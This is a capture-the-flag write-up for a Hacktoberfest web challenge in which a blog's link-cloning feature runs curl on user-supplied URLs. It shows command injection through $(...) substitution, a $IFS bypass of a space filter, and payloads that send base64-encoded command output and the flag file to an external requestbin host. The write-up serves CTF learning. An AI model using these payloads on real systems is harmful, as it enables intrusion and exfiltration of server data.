# 0xrabin AnonBlog
```hacktoberfest_ctf{shell_kek_rice_fbf8619ff7f156139cdaf4d7e3e06d75}```

Challenge Description
>There is a place Anonymous blog, people say you cannot share link there because it's their policy. They say sharing link leads to many security issues, though I think it's just opposite based on their specific context(their new feature)

http://nicehellonice-env.eba-p2umpa4t.us-east-1.elasticbeanstalk.com

It was a site where we can add posts through /post.
Cross Site Scripting was possible. At first I thought we use an xss payload to grab the cookie of the admin but it seemed like xss was just a rabbithole.

Checking the robots.txt of the site we find /features.txt that says
```
Newly added feature: Special Hyper Linking!
 - Automatically converts links into a hyperlink.
 - Try setting any URL in the Content, and see it!!
 NOTE: For some dumb reason, link-sharing was not allowed since day 1.
    But due to requests from the users we made it available for it. But
    you still cannot share links, so this application clones the URL
    locally (using curlY "ree--quest-TOR")*, then returns it to you
    from the application itself.
----------
*pronounced "curly requester"
```
So in my head I thought it as of
`curl https://site`
being executed whenever http/https word is used. So next step was to get code execution.

At first I tried common bypasses like `&&` `||` but since the output was not  being shown, I was not sure if the command was being executed.

So I thought of another approach to send command output to a url. I quickly setup a request bin url and crafted my payload using command substitution like

`http://requestbin.net/r/1bvgn5b1/?output=$(command|base64)`
So what this will look like 

```sh
curl http://requestbin.net/r/1bvgn5b1/?output=$(command|base64)
$(command|base64) get executed and base64 output would be appended to output =
curl http://requestbin.net/r/1bvgn5b1/?output=base64output
```

And through http://requestbin.net/r/1bvgn5b1?inspect I could view the requests being made to the site.

Now that we have command execution with proper output. It was time to find the flag. Actually  using space in command was blocked. So I had to use $IFS instead for every command that contains space.




For example: `$(ls -la)` became `$(ls$IFS-la)`.



I looked around and found a file named `zhululu_2e3817293fc275dbee74bd71ce6eb056_FLAG_4e4d6c332b6fe62a63afe56171fd3725.txt` which contained the flag.



Then I read the file using  `$(base64$IFS-w$IFS\0$IFS/zh*)`


```sh
Sidenote
There is \ before 0 because $IFS0 would simply escape 0 it is behaviour of $IFS to escape suffix if there is no use of symbols like -, | etc.
```

On the request bin inspect tab I recieved

```Q29uZ3JhdHMhISBZb3UgbWFkZSB0aWxsIHRoZSBmbGFnIPCfjokKCgpHcmFiIGl0LCBpdCdzIGJlbG93OgpoYWNrdG9iZXJmZXN0X2N0ZntzaGVsbF9rZWtfcmljZV9mYmY4NjE5ZmY3ZjE1NjEzOWNkYWY0ZDdlM2UwNmQ3NX0K```

Decoding the base64 we get 


```
Congrats!! You made till the flag 🎉
Grab it, it's below:
hacktoberfest_ctf{shell_kek_rice_fbf8619ff7f156139cdaf4d7e3e06d75}
```
```hacktoberfest_ctf{shell_kek_rice_fbf8619ff7f156139cdaf4d7e3e06d75}```